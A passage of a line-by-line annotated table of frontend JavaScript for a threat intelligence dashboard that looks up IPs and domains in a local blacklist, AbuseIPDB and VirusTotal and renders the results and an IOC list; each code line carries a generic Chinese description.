| 92 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (type === "ip" && !IP_RE.test(value)) return "IP 地址格式不合法";` |
| 93 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (type === "domain" && !DOMAIN_RE.test(value)) return "域名格式不合法";` |
| 94 | 返回结果：把计算值交给调用方。 | `    return null;` |
| 95 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 96 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 97 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function providerLabel(p) {` |
| 98 | 返回结果：把计算值交给调用方。 | `    return (` |
| 99 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      { local: "本地黑名单", abuseipdb: "AbuseIPDB", virustotal: "VirusTotal" }[p] \|\|` |
| 100 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      p` |
| 101 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 102 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 103 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 104 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 105 | 注释：说明前端逻辑或交互意图。 | `   * Provider 状态` |
| 106 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 107 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function loadProviders() {` |
| 108 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 109 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const data = await fetchApi("/api/threat_intel/providers");` |
| 110 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.providers = {` |
| 111 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        local: data.local \|\| { enabled: true, configured: true, mock: false },` |
| 112 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        abuseipdb: data.abuseipdb \|\| {` |
| 113 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          enabled: false,` |
| 114 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          configured: false,` |
| 115 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          mock: false,` |
| 116 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 117 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        virustotal: data.virustotal \|\| {` |
| 118 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          enabled: false,` |
| 119 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          configured: false,` |
| 120 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          mock: false,` |
| 121 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 122 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      };` |
| 123 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (_) {` |
| 124 | 注释：说明前端逻辑或交互意图。 | `      // 拉取失败时保持默认值` |
| 125 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 126 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderProviderStatus();` |
| 127 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 128 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 129 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderProviderStatus() {` |
| 130 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const parts = Object.keys(state.providers).map((p) => {` |
| 131 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const info = state.providers[p];` |
| 132 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const label = providerLabel(p);` |
| 133 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      let suffix = "";` |
| 134 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (info.configured) suffix = '<strong style="color: var(--accent-emerald)">已配置</strong>';` |
| 135 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      else if (info.mock) suffix = '<strong style="color: var(--threat-medium)">MOCK 模式</strong>';` |
| 136 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      else suffix = '<strong style="color: var(--text-tertiary)">未启用</strong>';` |
| 137 | 返回结果：把计算值交给调用方。 | `      return \`<span>${escapeHtml(label)} ${suffix}</span>\`;` |
| 138 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 139 | 页面更新：修改元素内容、样式或状态。 | `    el.providerStatus.innerHTML = parts.join("");` |
| 140 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 141 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 142 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 143 | 注释：说明前端逻辑或交互意图。 | `   * 查询面板` |
| 144 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 145 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindQueryHandlers() {` |
| 146 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnQueryTypes.forEach((btn) => {` |
| 147 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      btn.addEventListener("click", () => {` |
| 148 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.queryType = btn.dataset.queryType;` |
| 149 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        el.btnQueryTypes.forEach((b) =>` |
| 150 | 页面更新：修改元素内容、样式或状态。 | `          b.classList.toggle("is-active", b === btn)` |
| 151 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 152 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.qValue.placeholder =` |
| 153 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          state.queryType === "ip" ? "1.2.3.4" : "evil-example.com";` |
| 154 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 155 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 156 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.btnQuery.addEventListener("click", runQuery);` |
| 157 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.qValue.addEventListener("keydown", (e) => {` |
| 158 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (e.key === "Enter") {` |
| 159 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        e.preventDefault();` |
| 160 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        runQuery();` |
| 161 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 162 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 163 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnQueryClear.addEventListener("click", () => {` |
| 164 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.qValue.value = "";` |
| 165 | 页面更新：修改元素内容、样式或状态。 | `      el.providerGrid.innerHTML = "";` |
| 166 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.verdict.hidden = true;` |
| 167 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 168 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 169 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 170 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function runQuery() {` |
| 171 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const value = el.qValue.value.trim();` |
| 172 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const type = state.queryType;` |
| 173 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const err = validateValue(type, value);` |
| 174 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (err) {` |
| 175 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast(err, "error");` |
| 176 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.qValue.focus();` |
| 177 | 返回结果：把计算值交给调用方。 | `      return;` |
| 178 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 179 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 180 | 注释：说明前端逻辑或交互意图。 | `    // providers 选择：能用的全部并行请求` |
| 181 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const providers = ["local"]; // local 始终可查` |
| 182 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.providers.abuseipdb.enabled && type === "ip") providers.push("abuseipdb");` |
| 183 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.providers.virustotal.enabled) providers.push("virustotal");` |
| 184 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 185 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderLoadingCards(providers);` |
| 186 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 187 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 188 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const resp = await fetchApi("/api/threat_intel/query", {` |
| 189 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method: "POST",` |
| 190 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        body: { type, value, providers },` |
| 191 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 192 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      renderVerdict(resp, type, value);` |
| 193 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      renderResults(resp.results, type);` |
| 194 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 195 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.verdict.hidden = true;` |
| 196 | 页面更新：修改元素内容、样式或状态。 | `      el.providerGrid.innerHTML = \`<div class="provider-card"><div class="provider-card__header"><h4 class="provider-card__title">查询失败</h4></div><div class="text-tertiary" style="font-size: var(--fs-caption)">${escapeHtml(` |
| 197 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        err.message \|\| ""` |
| 198 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      )}</div></div>\`;` |
| 199 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 200 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 201 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 202 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderLoadingCards(providers) {` |
| 203 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.verdict.hidden = true;` |
| 204 | 页面更新：修改元素内容、样式或状态。 | `    el.providerGrid.innerHTML = providers` |
| 205 | 遍历处理：逐项渲染或转换数据。 | `      .map(` |
| 206 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        (p) => \`` |
| 207 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <div class="provider-card" data-provider="${escapeHtml(p)}">` |
| 208 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          <div class="provider-card__header">` |
| 209 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            <h4 class="provider-card__title">${escapeHtml(providerLabel(p))}</h4>` |
| 210 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            <span class="provider-card__status"><span class="loader" style="vertical-align: middle"></span> 查询中</span>` |
| 211 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          </div>` |
| 212 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        </div>\`` |
| 213 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      )` |
| 214 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .join("");` |
| 215 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 216 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 217 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderVerdict(resp, type, value) {` |
| 218 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const overall = resp.overall \|\| {};` |
| 219 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.verdict.hidden = false;` |
| 220 | 页面更新：修改元素内容、样式或状态。 | `    el.verdict.classList.toggle("query-verdict--threat", !!overall.is_malicious);` |
| 221 | 页面更新：修改元素内容、样式或状态。 | `    el.verdict.classList.toggle("query-verdict--clean", !overall.is_malicious);` |
| 222 | 页面更新：修改元素内容、样式或状态。 | `    el.verdictStatus.textContent = overall.is_malicious ? "威胁命中" : "未命中威胁情报";` |
| 223 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const hits = overall.providers_hit \|\| [];` |
| 224 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const maxScore = overall.max_score;` |
| 225 | 页面更新：修改元素内容、样式或状态。 | `    el.verdictDetail.textContent =` |
| 226 | 遍历处理：逐项渲染或转换数据。 | `      (hits.length ? \`命中来源：${hits.map(providerLabel).join(" / ")}\` : "所有 provider 均未命中") +` |
| 227 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (typeof maxScore === "number" ? \` · 最高评分 ${maxScore}\` : "");` |
| 228 | 页面更新：修改元素内容、样式或状态。 | `    el.verdictValue.textContent = \`[${type.toUpperCase()}] ${value}\`;` |
| 229 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 230 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 231 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderResults(results, type) {` |
| 232 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!results) {` |
| 233 | 页面更新：修改元素内容、样式或状态。 | `      el.providerGrid.innerHTML = "";` |
| 234 | 返回结果：把计算值交给调用方。 | `      return;` |
| 235 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 236 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const order = ["local", "abuseipdb", "virustotal"];` |
| 237 | 页面更新：修改元素内容、样式或状态。 | `    el.providerGrid.innerHTML = order` |
| 238 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      .filter((p) => results[p])` |
| 239 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      .map((p) => renderProviderCard(p, results[p], type))` |
| 240 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .join("");` |
| 241 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 242 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 243 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderProviderCard(provider, r, type) {` |
| 244 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const label = providerLabel(provider);` |
| 245 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const notOk = !r.ok;` |
| 246 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const hit = !!(r.is_malicious \|\| r.hit);` |
| 247 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const cardClass =` |
| 248 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "provider-card" +` |
| 249 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (notOk ? " provider-card--disabled" : "") +` |
| 250 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (!notOk && hit ? " provider-card--hit" : "") +` |
| 251 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (!notOk && !hit ? " provider-card--clean" : "");` |
| 252 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 253 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const headerBadges = [];` |
| 254 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (r.mocked) headerBadges.push('<span class="badge badge--mock">MOCK</span>');` |
| 255 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!notOk) {` |
| 256 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      headerBadges.push(` |
| 257 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        hit` |
| 258 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          ? '<span class="badge badge--hit">HIT</span>'` |
| 259 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          : '<span class="badge badge--clean">CLEAN</span>'` |
| 260 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      );` |
| 261 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 262 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 263 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    let body = "";` |
| 264 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    let footer = "";` |
| 265 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 266 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (notOk) {` |
| 267 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      body = \`<div class="text-tertiary" style="font-size: var(--fs-caption)">${escapeHtml(reasonToZh(r.reason))}</div>\`;` |
| 268 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } else if (provider === "local") {` |
| 269 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const rows = [];` |
| 270 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      rows.push(kv("命中", hit ? "是" : "否"));` |
| 271 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (r.score !== null && r.score !== undefined) rows.push(kv("评分", r.score));` |
| 272 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (r.sources && r.sources.length)` |
| 273 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        rows.push(kv("来源", r.sources.join(", ")));` |
| 274 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (r.added_at) rows.push(kv("加入", formatTime(r.added_at)));` |
| 275 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      rows.push(kv("命中次数", r.hits ?? 0));` |
| 276 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      body = '<dl class="provider-card__body">' + rows.join("") + "</dl>";` |
| 277 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (r.reason) footer = \`<div>${escapeHtml(r.reason)}</div>\`;` |
| 278 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } else if (provider === "abuseipdb") {` |
| 279 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const rows = [` |
| 280 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kv("置信度", \`${r.score ?? 0} / 100\`),` |
| 281 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kv("国家", r.country_code \|\| "—"),` |
| 282 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kv("ISP", r.isp \|\| "—"),` |
| 283 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kv("用途", r.usage_type \|\| "—"),` |
| 284 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kv("举报总数", r.total_reports ?? 0),` |
| 285 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ];` |
| 286 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (r.last_reported_at)` |
| 287 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        rows.push(kv("最后举报", formatTime(r.last_reported_at)));` |
| 288 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      body = '<dl class="provider-card__body">' + rows.join("") + "</dl>";` |
| 289 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } else if (provider === "virustotal") {` |
| 290 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const rows = [` |
| 291 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kv("恶意", r.malicious ?? 0),` |
| 292 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kv("可疑", r.suspicious ?? 0),` |
| 293 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kv("无害", r.harmless ?? 0),` |
| 294 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kv("未知", r.undetected ?? 0),` |
| 295 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kv("声誉", r.reputation ?? 0),` |
| 296 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ];` |
| 297 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (type === "ip") {` |
| 298 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (r.country) rows.push(kv("国家", r.country));` |
| 299 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (r.as_owner) rows.push(kv("AS", r.as_owner));` |
| 300 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (r.network) rows.push(kv("网段", r.network));` |
| 301 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else {` |
| 302 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (r.registrar) rows.push(kv("注册商", r.registrar));` |
| 303 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (r.categories && Object.keys(r.categories).length) {` |
| 304 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `          const cats = Object.entries(r.categories)` |
| 305 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `            .map(([k, v]) => \`${k}:${v}\`)` |
| 306 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            .join(", ");` |
| 307 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          rows.push(kv("分类", cats));` |
| 308 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        }` |
| 309 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 310 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      body = '<dl class="provider-card__body">' + rows.join("") + "</dl>";` |
| 311 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 312 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 313 | 返回结果：把计算值交给调用方。 | `    return \`` |
| 314 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      <div class="${cardClass}">` |
| 315 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        <div class="provider-card__header">` |
| 316 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          <h4 class="provider-card__title">${escapeHtml(label)}</h4>` |
| 317 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          <div style="display: flex; gap: 6px">${headerBadges.join("")}</div>` |
| 318 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        </div>` |
| 319 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ${body}` |
| 320 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ${footer ? \`<div class="provider-card__footer">${footer}</div>\` : ""}` |
| 321 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      </div>\`;` |
| 322 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 323 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 324 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function kv(k, v) {` |
| 325 | 返回结果：把计算值交给调用方。 | `    return \`<dt>${escapeHtml(k)}</dt><dd>${escapeHtml(String(v))}</dd>\`;` |
| 326 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 327 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 328 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function reasonToZh(reason) {` |
| 329 | 返回结果：把计算值交给调用方。 | `    return (` |
| 330 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      {` |
| 331 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        api_key_missing: "未配置 API Key（生产环境请在 .env 中填入）",` |
| 332 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        invalid_ip_format: "IP 地址格式非法",` |
| 333 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        invalid_domain_format: "域名格式非法",` |
| 334 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        timeout: "请求超时",` |
| 335 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        request_error: "请求失败",` |
| 336 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        parse_error: "响应解析失败",` |
| 337 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }[reason] \|\| reason \|\| "未知错误"` |
| 338 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 339 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 340 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 341 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 342 | 注释：说明前端逻辑或交互意图。 | `   * IOC 列表` |
| 343 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 344 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function loadList() {` |
| 345 | 页面更新：修改元素内容、样式或状态。 | `    el.tbody.innerHTML =` |
| 346 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<tr><td colspan="8" class="alert-list__empty"><span class="loader"></span><span style="margin-left: 8px">加载中…</span></td></tr>';` |
| 347 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const query = {};` |
| 348 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.filter.type) query.type = state.filter.type;` |
| 349 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.filter.source) query.source = state.filter.source;` |
| 350 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.filter.q) query.q = state.filter.q;` |
| 351 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 352 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const data = await fetchApi("/api/threat_intel", { query });` |
| 353 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.iocs = data.entries \|\| [];` |
| 354 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      updateStats(data.stats \|\| {});` |
| 355 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshSourceOptions(data.stats \|\| {});` |
| 356 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      renderTable(state.iocs);` |
| 357 | 页面更新：修改元素内容、样式或状态。 | `      el.listStatus.textContent = state.iocs.length` |
| 358 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ? \`共 ${state.iocs.length} 条\`` |
| 359 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        : "";` |
| 360 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 361 | 页面更新：修改元素内容、样式或状态。 | `      el.tbody.innerHTML =` |
| 362 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<tr><td colspan="8" class="alert-list__empty">' +` |
| 363 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        escapeHtml("拉取失败：" + (err.message \|\| "")) +` |
| 364 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "</td></tr>";` |
| 365 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 366 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 367 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 368 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function updateStats(stats) {` |
| 369 | 页面更新：修改元素内容、样式或状态。 | `    el.countTotal.textContent = String(stats.total \|\| 0);` |
| 370 | 页面更新：修改元素内容、样式或状态。 | `    el.countIp.textContent = String(stats.ip_count \|\| 0);` |
| 371 | 页面更新：修改元素内容、样式或状态。 | `    el.countDomain.textContent = String(stats.domain_count \|\| 0);` |
| 372 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 373 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 374 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function refreshSourceOptions(stats) {` |
| 375 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const current = el.selSource.value;` |
| 376 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const sources = Object.keys(stats.by_source \|\| {});` |
| 377 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const frag = ['<option value="">全部来源</option>'];` |
| 378 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    sources.sort().forEach((s) => {` |
| 379 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      frag.push(` |
| 380 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        \`<option value="${escapeHtml(s)}"${s === current ? " selected" : ""}>${escapeHtml(s)}</option>\`` |
| 381 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      );` |
| 382 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 383 | 页面更新：修改元素内容、样式或状态。 | `    el.selSource.innerHTML = frag.join("");` |
| 384 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 385 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 386 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderTable(items) {` |
| 387 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!items.length) {` |
| 388 | 页面更新：修改元素内容、样式或状态。 | `      el.tbody.innerHTML =` |
| 389 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<tr><td colspan="8" class="alert-list__empty">' +` |
| 390 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<div class="empty-state">' +` |
| 391 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<div class="empty-state__title">当前筛选下暂无 IOC</div>' +` |
| 392 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<div class="empty-state__hint">点右上「新增 IOC」或「生成演示 IOC」</div>' +` |
| 393 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "</div></td></tr>";` |
| 394 | 返回结果：把计算值交给调用方。 | `      return;` |
| 395 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 396 | 页面更新：修改元素内容、样式或状态。 | `    el.tbody.innerHTML = items.map(renderRow).join("");` |
| 397 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 398 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 399 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderRow(e) {` |
| 400 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const typeBadge =` |
| 401 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="badge badge--' +` |
| 402 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (e.type === "ip" ? "signature" : "anomaly") +` |
